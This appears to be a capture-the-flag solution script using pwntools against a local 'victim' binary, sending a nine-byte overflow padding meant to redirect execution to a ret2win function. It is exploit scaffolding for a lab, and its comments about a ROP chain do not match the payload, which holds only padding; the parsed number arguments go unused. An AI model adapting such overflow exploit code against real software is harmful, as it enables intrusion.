from pwn import *

if (len(sys.argv) < 3):
    print(f"Usage: ./adder_sol.py <num1> <num2>")
    exit()

num1 = int(sys.argv[1])
num2 = int(sys.argv[2])

# RIP offset is at 9
pad = "A" * 9

# Consturct payload
payload = bytes(pad, 'utf-8')

# Start process and send rop chain
e = process('victim')

print("Waiting for gdb connection, press Enter to continue")
input()

print (e.recv())
e.sendline(payload)

# Print output of ret2win()
output = e.recvall()
print (output)
